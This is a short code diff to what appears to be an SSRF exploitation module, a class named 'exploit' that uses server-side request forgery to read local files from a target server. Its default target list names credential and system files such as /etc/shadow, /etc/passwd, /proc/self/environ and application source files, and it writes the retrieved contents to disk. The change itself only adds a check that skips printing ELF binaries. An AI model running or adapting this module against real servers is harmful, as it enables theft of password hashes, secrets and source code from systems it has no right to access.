@@ -13,6 +13,7 @@ class exploit():
     def __init__(self, requester, args):
         logging.info(f"Module '{name}' launched !")
         self.files = args.targetfiles.split(',') if args.targetfiles != None else ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]   
+        self.file_magic = {'elf' : bytes([0x7f, 0x45, 0x4c, 0x46])}
         
         r = requester.do_request(args.param, "")
         
@@ -31,7 +32,10 @@ class exploit():
 
                     # Display diff between default and ssrf request
                     logging.info(f"\033[32mReading file\033[0m : {f}")
-                    print(diff)
+                    if bytes(diff, encoding='utf-8').startswith(self.file_magic["elf"]):
+                        print("ELF binary found - not printing to stdout")
+                    else:
+                        print(diff)
 
                     # Write diff to a file
                     filename = f.replace('\\','_').replace('/','_')
